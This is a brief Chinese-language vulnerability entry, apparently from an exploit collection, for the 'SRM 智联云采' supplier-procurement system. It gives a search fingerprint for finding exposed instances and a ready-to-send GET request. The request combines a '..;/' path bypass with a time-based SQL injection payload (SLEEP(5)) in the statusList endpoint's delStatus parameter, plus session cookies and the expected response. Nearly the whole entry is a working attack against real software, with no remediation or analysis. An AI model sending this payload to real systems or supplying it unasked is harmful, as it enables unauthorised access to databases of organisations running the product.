# SRM智联云采系统statusList存在SQL注入漏洞

- **系统**：SRM　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="SRM 2.0"`
- **请求**：`GET /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=11%20AND%20(SELECT%20777%20FROM%20(SELECT(SLEEP(5)))AZX) HTTP/1.1`
- **关键头**：`Cookie: zhilink.session.id=634a563e38864f49a62cbaac4ebbe419; JSESSIONID=AA0ABCE37B133958…`
- **预期**：200　|　—